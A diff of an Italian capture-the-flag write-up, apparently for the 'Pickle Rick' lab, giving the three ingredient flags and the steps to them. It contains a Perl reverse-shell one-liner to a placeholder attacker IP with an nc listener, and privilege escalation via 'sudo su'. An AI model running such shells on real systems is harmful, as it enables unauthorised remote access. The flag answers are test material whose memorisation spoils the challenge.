@@ -24,5 +24,28 @@ _________________
   perl -e 'use Socket;$i="YOUR-IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
 - in un terminale eseguire il comando: nc -lvnp PORT (la porta da selezionare dovrà essere la medesima inserita nel comando "perl")
 
+# What is the first ingredient that Rick needs?
+
+- una volta messi in comunicazione si può trovare il primo ingrediente nella directory /var/www/html
+
 ![Istantanea_2023-08-06_09-36-42](https://github.com/Manganaccio/Manganaccio/assets/137283468/74752716-7fb8-40b7-ad59-877b42e927dd)
 
+    Answer: mr. meeseek hair
+
+# What is the second ingredient in Rick’s potion?
+
+- nella medesima directory del primo ingrediente c'è un altro file interessante demoninato _clue.txt_: Look around the file system for the other ingredient.
+- navigando in home e successivamente nella cartella rick si trova il secondo ingrediente
+
+![Istantanea_2023-08-06_09-38-48](https://github.com/Manganaccio/Manganaccio/assets/137283468/7b8841b0-25bc-476f-b64f-970ba538e2fb)
+
+    Answer: 1 jerry tear
+
+# What is the last and final ingredient?
+
+- eseguendo il comando _sudo -l_ si nota che si possono scalare i privilegi eseguendo semplicente il comando: sudo su
+- una volta diventati root navigare nella relativa cartella per trovare l'ultimo ingrediente
+
+![Istantanea_2023-08-06_09-46-46](https://github.com/Manganaccio/Manganaccio/assets/137283468/270a464e-90ab-4144-b184-4f48ad496952)
+
+    Answer: fleeb juice
